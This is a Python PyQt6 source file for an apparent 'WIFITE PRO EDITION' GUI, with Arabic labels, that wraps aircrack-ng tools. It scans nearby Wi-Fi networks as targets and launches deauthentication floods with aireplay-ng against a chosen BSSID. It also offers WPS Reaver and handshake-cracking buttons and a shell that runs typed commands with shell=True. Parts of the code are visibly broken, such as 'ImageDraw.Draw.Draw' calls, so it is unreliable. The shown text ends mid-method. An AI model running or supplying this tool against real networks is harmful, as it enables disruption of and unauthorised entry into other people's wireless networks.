import sys
import os
import subprocess
import re
import csv
import webbrowser 

from PIL import Image, ImageDraw, ImageFilter
import math

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QLabel, QPushButton, QTableWidget, 
    QTableWidgetItem, QHeaderView, QListWidget, QGridLayout, 
    QFrame, QInputDialog, QMessageBox, QSizePolicy, QSpacerItem, QLineEdit,
    QTextEdit, QSplitter, QFileDialog 
)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal, QProcess
from PyQt6.QtGui import QFont, QTextCursor, QTextCharFormat, QColor, QMovie, QScreen 

REQUIRED_TOOLS = ['airmon-ng', 'airodump-ng', 'iwconfig', 'reaver', 'aircrack-ng']

# (الكود الخاص بـ create_startup_gif هنا - بدون تغيير)
def create_startup_gif(gif_path="pirate_hacker_background.gif"):
    if os.path.exists(gif_path):
        return

    W, H = 1280, 720
    DURATION_SEC = 5
    FPS = 20
    FRAMES = DURATION_SEC * FPS

    bg = (4, 8, 20)
    blue = (0, 150, 255)
    cyan = (0, 210, 255)
    white = (230, 240, 255)

    frames = []

    for i in range(FRAMES):
        t = i / FRAMES

        img = Image.new("RGB", (W, H), bg)
        d = ImageDraw.Draw.Draw(img)

        for x in range(0, W, 50):
            y_offset = int((t * 200 + x) % H)
            d.line((x, y_offset, x, y_offset + 40), fill=(0, 60, 120))

        cx, cy = W // 2, H // 2 - 40
        glow = Image.new("RGB", (W, H), (0, 0, 0))
        gd = ImageDraw.Draw.Draw(glow)
        gd.ellipse((cx - 200, cy - 200, cx + 200, cy + 200), fill=(0, 80, 160))
        glow = glow.filter(ImageFilter.Filter.GaussianBlur(50))
        img = Image.blend(img, glow, 0.6)
        d = ImageDraw.Draw.Draw(img)

        d.ellipse((cx - 70, cy - 60, cx + 70, cy + 60), outline=cyan, width=4)
        d.rectangle((cx - 45, cy + 40, cx + 45, cy + 110), outline=cyan, width=4)

        d.ellipse((cx - 35, cy - 10, cx - 10, cy + 15), fill=blue)
        d.ellipse((cx + 10, cy - 10, cx + 35, cy + 15), fill=blue)

        d.polygon([
            (cx - 80, cy - 40),
            (cx + 80, cy - 40),
            (cx + 60, cy - 80),
            (cx - 60, cy - 80)
        ], outline=cyan, width=4)

        d.line((cx - 120, cy + 120, cx + 120, cy - 120), fill=cyan, width=4)
        d.line((cx + 120, cy + 120, cx - 120, cy - 120), fill=cyan, width=4)

        pulse = int(10 * math.sin(t * 2 * math.pi))
        d.ellipse((cx - 90 - pulse, cy - 90 - pulse, cx + 90 + pulse, cy + 90 + pulse), outline=blue, width=2)

        bar_w, bar_h = 600, 14
        bx = (W - bar_w) // 2
        by = H - 110
        d.rectangle((bx, by, bx + bar_w, by + bar_h), outline=white, width=2)
        d.rectangle((bx, by, bx + int(bar_w * t), by + bar_h), fill=blue)

        text = "WIFITE PRO EDITION"
        try:
            text_w, text_h = d.textsize(text, font=None) 
        except:
            text_w = len(text) * 15 
            text_h = 20
        d.text(((W - text_w) / 2, by - 40), text, fill=cyan)

        frames.append(img)

    try:
        frames[0].save(
            gif_path,
            save_all=True,
            append_images=frames[1:],
            duration=int(1000 / FPS),
            loop=0
        )
    except Exception as e:
        print(f"❌ Error creating GIF. Is Pillow installed? (python3-pil): {e}", file=sys.stderr)


class AnimatedSplashScreen(QWidget):
    
    def __init__(self, gif_path="pirate_hacker_background.gif", duration_ms=5000):
        super().__init__()
        
        self.setWindowFlags(
            Qt.WindowType.SplashScreen | 
            Qt.WindowType.FramelessWindowHint
        )
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        self.movie_label = QLabel(self)
        self.movie = QMovie(gif_path)
        
        if self.movie.isValid():
            self.movie_label.setMovie(self.movie)
            self.movie.start()
            
            self.resize(self.movie.frameRect().size())
        else:
            print(f"❌ Error: Could not load GIF file at {gif_path}. Displaying quickly.", file=sys.stderr)
            duration_ms = 100 
            
        self.duration_ms = duration_ms
        
        screen_geometry = QApplication.primaryScreen().geometry()
        x = (screen_geometry.width() - self.width()) // 2
        y = (screen_geometry.height() - self.height()) // 2
        self.move(x, y)


    def start_timer(self, main_window):
        self.main_window = main_window
        QTimer.singleShot(self.duration_ms, self.finish_splash)

    def finish_splash(self):
        if self.movie.isValid():
             self.movie.stop()
        self.hide()
        self.main_window.showMaximized()


class DeauthWorker(QThread):
    finished = pyqtSignal(str, str, str) 

    def __init__(self, interface, bssid, log_message):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.log_message = log_message
        self.original_command_str = f"aireplay-ng --deauth 5 -a {bssid} {interface}"

    def run(self):
        try:
            command = [
                'sudo', 'aireplay-ng', 
                '--deauth', '5', 
                '-a', self.bssid, 
                '--ignore-negative-one', 
                self.interface 
            ]
            
            process = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if process.returncode != 0:
                self.finished.emit("ERROR", f"Deauth failed. Output: {process.stdout + process.stderr}", self.original_command_str)
            else:
                self.finished.emit("SUCCESS", process.stdout, self.original_command_str)
                
        except Exception as e:
            self.finished.emit("ERROR", f"Deauth Exception: {e}", self.original_command_str)


class WorkerThread(QThread):
    finished = pyqtSignal(str, str, str) 
    output_signal = pyqtSignal(str) 
    handshake_monitor_started = pyqtSignal(dict) 

    def __init__(self, command, log_message, continuous=False, shell_command=False, is_handshake_monitor=False):
        super().__init__()
        self.command = command 
        self.log_message = log_message
        self.continuous = continuous
        self.shell_command = shell_command
        self.is_handshake_monitor = is_handshake_monitor
        self.original_command_str = ' '.join(command) if isinstance(command, list) else command 
        
    def run(self):
        try:
            if self.shell_command:
                process = subprocess.run(
                    self.command,
                    shell=True,
                    executable='/bin/bash',
                    capture_output=True,
                    text=True,
                    timeout=30 
                )
                self.finished.emit("SUCCESS", process.stdout + process.stderr, self.original_command_str) 
                return

            command_list = self.command 
            
            process = subprocess.Popen(
                command_list, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT, 
                text=True,
                bufsize=1, 
                universal_newlines=True
            )

            if self.is_handshake_monitor:
                 filename = self.command[-1]
                 self.handshake_monitor_started.emit({"filename": filename, "bssid": self.command[4]})

            if self.continuous:
                for line in process.stdout:
                    self.output_signal.emit(line.strip())
            
            process.wait()
            
            output = process.stdout.read() if not self.continuous else ""
            
            if process.returncode != 0:
                self.finished.emit("ERROR", f"Command failed with code {process.returncode}. Output: {output}", self.original_command_str)
            else:
                 self.finished.emit("SUCCESS", output, self.original_command_str)

        except FileNotFoundError:
            self.finished.emit("ERROR", f"❌ Error: Command not found: {self.command[0]}.", self.original_command_str)
        except subprocess.TimeoutExpired:
             self.finished.emit("ERROR", f"❌ Error: Command timed out.", self.original_command_str)
        except Exception as e:
            self.finished.emit("ERROR", f"Unexpected error: {e}", self.original_command_str)


class WifiteProGUI(QMainWindow):
    
    GEMINI_URL = "https://gemini.google.com/" 
    
    # مسارات الخلفيات المحدثة
    MAIN_BG_PATH = "./Gemini_Generated_Image_xjmv9axjmv9axjmv.png" 
    POPUP_BG_PATH = "./Gemini_Generated_Image_xjmv9axjmv9axjmv.png"
    
    RESULT_COUNTER_DIR = "Wifite_Results"
    HANDSHAKE_DIR = "Handshake_Caps" 

    def __init__(self):
        super().__init__()
        
        self.setWindowFlags(self.windowFlags() | Qt.WindowType.Window)
        
        self.setWindowTitle("WIFITE PRO EDITION - Full GUI")
        self.setGeometry(100, 100, 1350, 850) 
        
        self.result_counter = self._initialize_counter()
        
        self.networks_data = [] 
        self.current_interface = None
        self.base_interface = None # تم إبقاؤه لاستخدامه كواجهة أساسية

        # التصحيحات لمنع AttributeError
        self.worker = None
        self.deauth_worker = None
        self.timer = None          
        self.scan_process = None   

        self.csv_output_file = "networks-scan"
        
        self.cli_prefix_text = "WIFITE PRO $>"
        self.terminal_prefix_text = os.environ.get('USER', 'user') + "@" + os.environ.get('HOSTNAME', 'localhost') + ":~$" 
        self.current_handshake_file = None
        self.command_history = [] 
        self.history_index = -1 
        
        self.terminal_active = False 
        self.current_process = None 

        self.apply_style()
        
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)

        left_panel = QFrame()
        left_panel.setFixedWidth(500) 
        left_layout = QVBoxLayout(left_panel) 
        
        self.network_frame = QFrame()
        left_layout_network = QVBoxLayout(self.network_frame)
        self._create_network_scanner_section(left_layout_network)

        self.attack_frame_container = QFrame()
        left_layout_attack = QVBoxLayout(self.attack_frame_container)
        self._create_attack_options_section(left_layout_attack)

        self.utility_frame_container = QFrame()
        left_layout_utility = QVBoxLayout(self.utility_frame_container)
        self._create_utility_buttons_section(left_layout_utility)
        
        left_layout.addWidget(self.network_frame)
        left_layout.addWidget(self.attack_frame_container)
        left_layout.addWidget(self.utility_frame_container)
        
        right_panel = QFrame()
        right_layout = QVBoxLayout(right_panel)
        
        self.splitter = QSplitter(Qt.Orientation.Vertical)
        
        self._create_log_analysis_section(self.splitter) 
        self._create_log_summary_section_widget(self.splitter)
        
        self.splitter.setHandleWidth(0) 
        self.splitter.handle(1).setEnabled(False) 
        self.splitter.setSizes([700, 100])
        
        right_layout.addWidget(self.splitter)
        
        main_layout.addWidget(left_panel) 
        main_layout.addWidget(right_panel)

        self.start_scan_btn.setEnabled(False)
        self.stop_monitor_btn.setEnabled(False) 
        self.stop_scan_btn.setEnabled(False) 
        self.ai_assistant_btn.setEnabled(True) 
        
        self.log_message(f"✅ Wifite PRO Edition Ready. Results will be saved in: {self.RESULT_COUNTER_DIR}/")
        self.check_system_requirements()
        
        self.insert_cli_prefix() 


    def _initialize_counter(self):
        if not os.path.exists(self.RESULT_COUNTER_DIR):
            os.makedirs(self.RESULT_COUNTER_DIR)
            
        handshake_path = os.path.join(self.RESULT_COUNTER_DIR, self.HANDSHAKE_DIR)
        if not os.path.exists(handshake_path):
            os.makedirs(handshake_path)
            
        max_num = 0
        pattern = re.compile(r'result_(\d+)\.txt$')
        
        for filename in os.listdir(self.RESULT_COUNTER_DIR):
            match = pattern.match(filename)
            if match:
                max_num = max(max_num, int(match.group(1)))
        
        return max_num + 1

    def save_result_to_file(self, command_str, status, result):
        filename = f"result_{self.result_counter}.txt"
        filepath = os.path.join(self.RESULT_COUNTER_DIR, filename)
        
        log_content = (
            "================================================\n"
            f"Result Index: {self.result_counter}\n"
            f"Command Executed: {command_str}\n"
            f"Status: {status}\n"
            "================================================\n\n"
            f"{result}\n\n"
            "====================== END =====================\n"
        )
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(log_content)
            
            self.log_message(f"💾 Output saved to file: **{filepath}**")
            self.result_counter += 1
            
        except Exception as e:
            self.log_message(f"❌ Error saving result to file: {e}")


    def apply_style(self):
        if os.path.exists(self.MAIN_BG_PATH):
            self.setStyleSheet(f"""
                QMainWindow {{
                    background-image: url({self.MAIN_BG_PATH});
                    background-repeat: no-repeat;
                    background-position: center;
                    background-attachment: fixed; 
                }}
                QFrame, QWidget {{
                    background-color: rgba(0, 0, 0, 0); 
                    border: none;
                }}
                QTableWidget {{
                    background-color: rgba(0, 0, 0, 0.4);
                    color: #00ffc4;
                    border: 1px solid #00fff2;
                    selection-background-color: #00fff2;
                    selection-color: black;
                }}
                QHeaderView::section {{
                    background-color: #000000;
                    color: #00fff2;
                    border-bottom: 2px solid #00fff2;
                    padding: 4px;
                }}
                QLabel, QTableWidgetItem {{
                    color: #00fff2;
                    font-size: 10pt;
                }}
                QPushButton {{
                    background-color: #ffc400; 
                    color: black;
                    border: 1px solid #ffaa00;
                    padding: 8px;
                    border-radius: 5px;
                    font-weight: bold;
                }}
                QPushButton:hover {{
                    background-color: #ffaa00; 
                }}
                QPushButton:disabled {{
                    background-color: #404040;
                    color: #888888;
                }}
                QTextEdit {{
                    background-color: rgba(0, 0, 0, 0.6);
                    color: #00ffc4;
                    border: 1px solid #00fff2;
                    font-family: 'Monospace';
                    font-size: 9pt;
                }}
            """)
        else:
            self.setStyleSheet("QMainWindow { background-color: #101010; }") 

    def check_system_requirements(self):
        missing = []
        for tool in REQUIRED_TOOLS:
            try:
                # الكود المُصحح لاستخدام 'which' بدلاً من 'command'
                subprocess.run(['which', tool], check=True, capture_output=True) 
            except subprocess.CalledProcessError:
                missing.append(tool)
            except FileNotFoundError:
                self.log_message(f"❌ Error: 'which' command or essential system tools are missing.")
                missing.append(tool)

        if missing:
            self.log_message(f"🔴 Warning: Missing essential tools: {', '.join(missing)}")
            self.log_message("Please run the script with 'sudo ./run_wifite.sh' to install dependencies.")
            self.start_scan_btn.setEnabled(False)
        else:
            self.log_message("🟢 All essential tools are available.")
            self.get_initial_interfaces()
            # الزر سيتم تفعيله فقط بعد اختيار واجهة المراقبة يدوياً
            
        
    # تم تعديل هذه الدالة للسماح بالتشغيل حتى بدون واجهات في القائمة (إذا كان الإخراج غير نظيف)
    def get_initial_interfaces(self):
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True, timeout=5)
            interfaces = re.findall(r'^(\w+)\s+IEEE', result.stdout, re.MULTILINE)
            
            self.interface_list.clear()
            
            if interfaces:
                self.base_interface = interfaces[0]
                for iface in interfaces:
                    self.interface_list.addItem(iface)
                self.log_message(f"Default base Interface set to: **{self.base_interface}**")
            else:
                self.log_message("⚠️ No wireless interfaces found initially. You must enter the interface name manually (e.g., wlan0 or wlan0mon).")
                self.base_interface = 'wlan0' # افتراض قيمة أولية

        except Exception as e:
            self.log_message(f"❌ Error getting interfaces: {e}")

    def _create_network_scanner_section(self, layout):
        section_label = QLabel("<h4>قائمة الشبكات المكتشفة (Targets)</h4>")
        layout.addWidget(section_label)
        
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(5) 
        self.network_table.setHorizontalHeaderLabels(["BSSID", "ESSID", "Channel", "Power", "Encryption"])
        self.network_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.network_table.horizontalHeader().setStretchLastSection(True)
        self.network_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        layout.addWidget(self.network_table)
        
        # القائمة أصبحت للقراءة أو للمعلومات فقط
        self.interface_list = QListWidget()
        self.interface_list.setFixedHeight(60)
        layout.addWidget(self.interface_list)
        
        button_layout = QHBoxLayout()
        # تمت إعادة صياغة الزر لفتح النافذة المنبثقة
        self.interface_select_btn = QPushButton("ضبط واجهة المراقبة (Set Monitor IFACE)")
        self.interface_select_btn.clicked.connect(self.select_monitor_interface)
        button_layout.addWidget(self.interface_select_btn)
        
        self.start_scan_btn = QPushButton("بدء مسح الشبكات")
        self.start_scan_btn.clicked.connect(self.start_network_scan)
        button_layout.addWidget(self.start_scan_btn)
        
        self.stop_scan_btn = QPushButton("إيقاف المسح (Stop Scan)")
        self.stop_scan_btn.clicked.connect(lambda: self.stop_all_processes(silent=False))
        button_layout.addWidget(self.stop_scan_btn)
        
        self.stop_monitor_btn = QPushButton("إيقاف وضع المراقبة")
        self.stop_monitor_btn.clicked.connect(self.stop_monitor_mode)
        button_layout.addWidget(self.stop_monitor_btn)

        layout.addLayout(button_layout)

    def _create_attack_options_section(self, layout):
        section_label = QLabel("<h4>خيارات الهجوم المتقدمة</h4>")
        layout.addWidget(section_label)
        
        attack_grid = QGridLayout()

        self.wpa_attack_btn = QPushButton("WPA/WPA2 HS (Airo)")
        self.wpa_attack_btn.clicked.connect(lambda: self.start_attack_automatic("WPA"))
        attack_grid.addWidget(self.wpa_attack_btn, 0, 0)
        
        self.wps_attack_btn = QPushButton("WPS Reaver")
        self.wps_attack_btn.clicked.connect(lambda: self.start_attack_automatic("WPS"))
        attack_grid.addWidget(self.wps_attack_btn, 0, 1)

        self.deauth_attack_btn = QPushButton("Deauth (Manual)")
        self.deauth_attack_btn.clicked.connect(self.start_deauth_manual)
        attack_grid.addWidget(self.deauth_attack_btn, 1, 0)
        
        self.crack_handshake_btn = QPushButton("Crack Handshake")
        self.crack_handshake_btn.clicked.connect(self.crack_handshake)
        attack_grid.addWidget(self.crack_handshake_btn, 1, 1)

        layout.addLayout(attack_grid)

    def _create_utility_buttons_section(self, layout):
        section_label = QLabel("<h4>أدوات النظام المساعدة</h4>")
        layout.addWidget(section_label)
        
        utility_grid = QGridLayout()

        self.shell_term_btn = QPushButton("SHELL / TERM:")
        self.shell_term_btn.clicked.connect(self.toggle_terminal_mode)
        utility_grid.addWidget(self.shell_term_btn, 0, 0)

        self.ssl_strip_btn = QPushButton("SSL Strip (Example)")
        self.ssl_strip_btn.clicked.connect(lambda: self.execute_shell_command("echo 'SSLStrip command executed (Placeholder)'"))
        utility_grid.addWidget(self.ssl_strip_btn, 1, 0)
        
        self.spoof_mac_btn = QPushButton("إنشاء عنوان MAC")
        self.spoof_mac_btn.clicked.connect(lambda: self.execute_shell_command("echo 'macchanger command executed (Placeholder)'"))
        utility_grid.addWidget(self.spoof_mac_btn, 1, 1)
        
        self.arp_scan_btn = QPushButton("إنهاء المراقبة")
        self.arp_scan_btn.clicked.connect(self.stop_monitor_mode)
        utility_grid.addWidget(self.arp_scan_btn, 2, 0)
        
        self.dns_spoof_btn = QPushButton("نافذة تفاصيل الخطأ")
        self.dns_spoof_btn.clicked.connect(self.show_error_popup)
        utility_grid.addWidget(self.dns_spoof_btn, 2, 1)

        self.ai_assistant_btn = QPushButton("C. ASSIST/START (Browser)")
        self.ai_assistant_btn.clicked.connect(self.open_gemini_in_browser)
        utility_grid.addWidget(self.ai_assistant_btn, 3, 0)
        
        self.exit_btn = QPushButton("إغلاق التطبيق")
        self.exit_btn.clicked.connect(self.exit_application)
        utility_grid.addWidget(self.exit_btn, 3, 1)

        layout.addLayout(utility_grid)

    def _create_log_analysis_section(self, parent_splitter):
        self.log_edit = QTextEdit()
        self.log_edit.setReadOnly(True)
        self.log_edit.setFont(QFont('Monospace', 9))
        self.log_edit.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse | Qt.TextInteractionFlag.TextSelectableByKeyboard)
        parent_splitter.addWidget(self.log_edit)

    def _create_log_summary_section_widget(self, parent_splitter):
        summary_widget = QWidget()
        summary_layout = QHBoxLayout(summary_widget)
        summary_layout.setContentsMargins(0, 0, 0, 0)

        self.status_label = QLabel(f"إجمالي الأهداف المكتشفة: 0")
        self.interface_label = QLabel(f"واجهة المراقب الحالية: N/A")
        
        summary_layout.addWidget(self.status_label)
        summary_layout.addSpacerItem(QSpacerItem(40, 20, QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Minimum))
        summary_layout.addWidget(self.interface_label)
        
        parent_splitter.addWidget(summary_widget)
        
    def open_gemini_in_browser(self):
        webbrowser.open(self.GEMINI_URL)
        self.log_message("🌐 Gemini Assistant opened in your browser.")
        
    def toggle_terminal_mode(self):
        if not self.terminal_active:
            self.log_message("Entering Shell Mode. Type 'exit' to return to WIFITE PRO mode.")
            self.log_edit.setText("")
            self.insert_terminal_prefix()
            self.terminal_active = True
            self.shell_term_btn.setText("WIFITE PRO MODE")
        else:
            self.log_message("Exiting Shell Mode. Returning to WIFITE PRO CLI.")
            self.insert_cli_prefix()
            self.terminal_active = False
            self.shell_term_btn.setText("SHELL / TERM:")
            
    def insert_cli_prefix(self):
        cursor = self.log_edit.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        self.log_edit.setTextCursor(cursor)
        
        format = QTextCharFormat()
        format.setForeground(QColor("#ffc400")) 
        cursor.insertText("\n")
        cursor.insertText(self.cli_prefix_text, format)

    def insert_terminal_prefix(self):
        cursor = self.log_edit.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        self.log_edit.setTextCursor(cursor)
        
        format = QTextCharFormat()
        format.setForeground(QColor("#00fff2"))
        cursor.insertText("\n")
        cursor.insertText(self.terminal_prefix_text + " ", format)
        
    def keyPressEvent(self, event):
        if event.key() == Qt.Key.Key_Return or event.key() == Qt.Key.Key_Enter:
            if self.terminal_active:
                self.process_terminal_command()
                return 

        if event.key() == Qt.Key.Key_Up:
            self.cycle_history(1)
        elif event.key() == Qt.Key.Key_Down:
            self.cycle_history(-1)

        super().keyPressEvent(event)

    def process_terminal_command(self):
        full_text = self.log_edit.toPlainText()
        lines = full_text.strip().split('\n')
        
        last_line_content = lines[-1]
        
        if last_line_content.startswith(self.terminal_prefix_text):
            command_str = last_line_content[len(self.terminal_prefix_text) + 1:].strip()
        else:
            command_str = last_line_content.strip()

        if not command_str:
            self.insert_terminal_prefix()
            return

        self.command_history.append(command_str)
        self.history_index = -1 

        if command_str.lower() == 'exit':
            self.toggle_terminal_mode()
            return
        
        if command_str.lower().startswith('clear'):
            self.log_edit.setText("")
            self.insert_terminal_prefix()
            return

        self.execute_shell_command(command_str)

    def cycle_history(self, direction):
        if not self.command_history:
            return

        if direction > 0: 
            if self.history_index == -1:
                self.history_index = len(self.command_history) - 1
            elif self.history_index > 0:
                self.history_index -= 1
        elif direction < 0: 
            if self.history_index == len(self.command_history) - 1:
                self.history_index = -1
                self.clear_current_input() 
                return
            elif self.history_index != -1:
                self.history_index += 1
        
        if self.history_index != -1:
            self.clear_current_input()
            self.log_edit.insertPlainText(self.command_history[self.history_index])

    def clear_current_input(self):
        cursor = self.log_edit.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        cursor.movePosition(QTextCursor.MoveOperation.StartOfLine, QTextCursor.MoveMode.KeepAnchor)
        
        prefix = self.terminal_prefix_text + " "
        
        if cursor.selectedText().startswith(prefix):
            start_pos = cursor.selectionStart() + len(prefix)
            end_pos = cursor.selectionEnd()
            
            cursor.setPosition(start_pos)
            cursor.movePosition(QTextCursor.MoveOperation.EndOfLine, QTextCursor.MoveMode.KeepAnchor)
            cursor.removeSelectedText()
            cursor.movePosition(QTextCursor.MoveOperation.EndOfLine)
            self.log_edit.setTextCursor(cursor)

    def execute_shell_command(self, command_str):
        self.log_message(f"Executing: **{command_str}**")

        self.worker = WorkerThread(command_str, self.log_message, continuous=False, shell_command=True)
        self.worker.finished.connect(self._command_finished)
        self.worker.start()
        
    def _command_finished(self, status, output, command_str):
        if status == "ERROR":
            self.log_message(f"❌ Command failed: {output}")
        else:
            self.log_message(output)
        
        if self.terminal_active:
            self.insert_terminal_prefix()
        else:
            self.insert_cli_prefix()
            
        self.save_result_to_file(command_str, status, output)

    def log_message(self, message):
        cursor = self.log_edit.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        self.log_edit.setTextCursor(cursor)
        
        if not message.startswith(self.cli_prefix_text) and not message.startswith(self.terminal_prefix_text):
            message = re.sub(r'\*\*(.*?)\*\*', r'<span style="color:#ffc400;">\1</span>', message)
            
            if "❌" in message:
                message = f'<span style="color:#ff0000; font-weight:bold;">{message}</span>'
            elif "🟢" in message or "✅" in message:
                message = f'<span style="color:#00ffc4; font-weight:bold;">{message}</span>'

            self.log_edit.append(message)
        else:
            self.log_edit.insertPlainText(message)

    # =========================================================================
    # دالة اختيار واجهة المراقبة المُعدلة لإظهار النافذة المنبثقة
    # =========================================================================
    def select_monitor_interface(self):
        self.stop_all_processes(silent=True) 

        # 1. إظهار النافذة المنبثقة لطلب اسم الواجهة
        current_iface = self.current_interface if self.current_interface else (self.base_interface if self.base_interface else 'wlan0')
        
        iface, ok = QInputDialog.getText(
            self, 
            'ضبط واجهة المراقبة (Monitor Interface)', 
            'أدخل اسم واجهة المراقبة (مثال: wlan0 أو wlan0mon):', 
            QLineEdit.EchoMode.Normal, 
            current_iface
        )

        if ok and iface:
            iface = iface.strip()
            self.log_message(f"Attempting to set **{iface}** as the Monitor Interface.")
            
            # 2. محاولة تشغيل airmon-ng start IFACE
            monitor_command = ['sudo', 'airmon-ng', 'start', iface]
            
            self.worker = WorkerThread(monitor_command, self.log_message)
            self.worker.finished.connect(lambda status, output, command: self._monitor_start_finished(status, output, command, input_iface=iface))
            self.worker.start()
        else:
            self.log_message("❌ Monitor Interface selection cancelled.")
    
    # =========================================================================
    # تم تعديل هذه الدالة للتعرف على واجهة المراقبة التي أدخلها المستخدم
    # =========================================================================
    def _monitor_start_finished(self, status, output, command_str, input_iface):
        self.log_message(output)
        
        # 1. التحقق من نتيجة airmon-ng
        if status == "SUCCESS":
            # في حالة النجاح، نبحث عن الاسم الجديد/الحالي
            
            # محاولة استخراج الواجهة الجديدة: (monitor mode enabled on <interface>)
            new_iface_match = re.search(r'\(monitor mode enabled on (.*?)\)', output)
            
            if new_iface_match:
                # استخدم الاسم الذي تم إرجاعه من airmon-ng (مثال: wlan0mon)
                new_iface = new_iface_match.group(1).split()[0].strip()
            else:
                # في حال لم يظهر الاسم الجديد، نستخدم الاسم الذي أدخله المستخدم
                # ونفترض أنه يعمل (خاصة إذا كان airmon-ng يعطي رسالة "already enabled")
                new_iface = input_iface 
            
            self.current_interface = new_iface
            self.interface_label.setText(f"واجهة المراقب الحالية: **{self.current_interface}**")
            self.log_message(f"🟢 Monitor mode enabled/set to **{self.current_interface}**.")
            self.start_scan_btn.setEnabled(True)
            self.stop_monitor_btn.setEnabled(True)
            
        else:
            # إذا فشل أمر airmon-ng
            self.log_message(f"❌ Failed to enable monitor mode on **{input_iface}**. Please try another name (e.g., wlan0mon) or ensure the adapter is capable.")
            self.current_interface = None
            self.interface_label.setText(f"واجهة المراقب الحالية: N/A")
            self.start_scan_btn.setEnabled(False) 

        self.insert_cli_prefix()


    def stop_monitor_mode(self):
        if not self.current_interface:
            self.log_message("❌ No interface is currently in monitor mode.")
            return

        self.stop_all_processes(silent=True) 
        
        # عند الإيقاف، نحاول إيقاف الواجهة الحالية المحددة
        stop_command = ['sudo', 'airmon-ng', 'stop', self.current_interface]
        
        self.log_message(f"Attempting to stop monitor mode on **{self.current_interface}**...")
        
        self.worker = WorkerThread(stop_command, self.log_message)
        self.worker.finished.connect(self._monitor_stop_finished)
        self.worker.start()

    def _monitor_stop_finished(self, status, output, command_str):
        self.log_message(output)
        
        if status == "SUCCESS":
            self.log_message(f"🟢 Monitor mode stopped on **{self.current_interface}**.")
            self.current_interface = None
            self.interface_label.setText(f"واجهة المراقب الحالية: N/A")
            self.stop_monitor_btn.setEnabled(False)
            self.get_initial_interfaces() # إعادة تحديث القائمة
        else:
            self.log_message("❌ Failed to stop monitor mode.")

        self.insert_cli_prefix()

    def start_network_scan(self):
        if not self.current_interface:
            self.log_message("❌ Error: Monitor IFACE is not set. Please use 'Set Monitor IFACE'.")
            return
        
        self.networks_data = [] 
        self.network_table.setRowCount(0)
        self.status_label.setText(f"إجمالي الأهداف المكتشفة: 0")

        self.stop_all_processes(silent=True) 

        self.log_message(f"--- بدء مسح الشبكات على **{self.current_interface}**... ---")
        
        scan_command = ['sudo', 'airodump-ng', '--output-format', 'csv', '-w', self.csv_output_file, self.current_interface]
        
        self.worker = WorkerThread(scan_command, self.log_message, continuous=True)
        self.worker.output_signal.connect(lambda x: None) 
        self.worker.finished.connect(self._scan_finished)
        self.worker.start()
        
        self.timer = QTimer(self) 
        self.timer.timeout.connect(self.read_and_update_networks)
        self.timer.start(1500) 

        self.start_scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)

    def _scan_finished(self, status, output, command_str):
        if status == "ERROR":
            self.log_message(f"❌ Scan failed: {output}")
        else:
            self.log_message("Scan thread finished.")

        if self.timer and self.timer.isActive():
            self.timer.stop()
            
        self.start_scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.insert_cli_prefix()

    def read_and_update_networks(self):
        try:
            csv_path = f"{self.csv_output_file}-01.csv"
            if not os.path.exists(csv_path):
                return
                
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as file:
                reader = csv.reader(file)
                networks_start = False
                temp_networks = []
                
                for row in reader:
                    if len(row) > 1 and row[0].strip() == 'BSSID':
                        networks_start = True
                        continue
                    
                    if networks_start and len(row) >= 14:
                        if not row[13].strip(): 
                             continue
                             
                        network = {
                            'BSSID': row[0].strip(),
                            'Channel': row[3].strip(),
                            'Power': row[8].strip(),
                            'Encryption': row[5].strip(), 
                            'ESSID': row[13].strip()
                        }
                        temp_networks.append(network)
                        
            if not temp_networks: return

            new_networks_count = 0
            
            existing_bssids = {n['BSSID'] for n in self.networks_data}
            for net in temp_networks:
                if net['BSSID'] not in existing_bssids:
                    self.networks_data.append(net)
                    new_networks_count += 1
            
            if new_networks_count > 0 or self.network_table.rowCount() == 0:
                self.network_table.setRowCount(len(self.networks_data))
                
                for i, net in enumerate(self.networks_data):
                    self.network_table.setItem(i, 0, QTableWidgetItem(net['BSSID']))
                    self.network_table.setItem(i, 1, QTableWidgetItem(net['ESSID']))
                    self.network_table.setItem(i, 2, QTableWidgetItem(net['Channel']))
                    self.network_table.setItem(i, 3, QTableWidgetItem(net['Power']))
                    self.network_table.setItem(i, 4, QTableWidgetItem(net['Encryption']))
                    
            self.status_label.setText(f"إجمالي الأهداف المكتشفة: {len(self.networks_data)}")

        except Exception as e:
            self.log_message(f"❌ Error reading CSV: {e}")

    def get_selected_target(self):
        selected_rows = self.network_table.selectionModel().selectedRows()
        if not selected_rows:
            return None
        
        row = selected_rows[0].row()
        return self.networks_data[row]

    def start_deauth_manual(self):
        target_network = self.get_selected_target()
        if not target_network:
            self.log_message("❌ Deauth failed: You must select a network target.")
            return

        if not self.current_interface:
            self.log_message("❌ Error: Monitor IFACE is not set. Please use 'Set Monitor IFACE'.")
            return

        bssid = target_network['BSSID']
        essid = target_network['ESSID']
        
        self.log_message(f"--- بدء هجوم Deauth يدوي على {essid} (BSSID: {bssid}) ---")

        self.deauth_worker = DeauthWorker(self.current_interface, bssid, self.log_message)
        self.deauth_worker.finished.connect(self._deauth_finished)
        self.deauth_worker.start()
        
        self.start_scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)

    def _deauth_finished(self, status, output, command_str):
        self.log_message(output)
        
        if status == "SUCCESS":
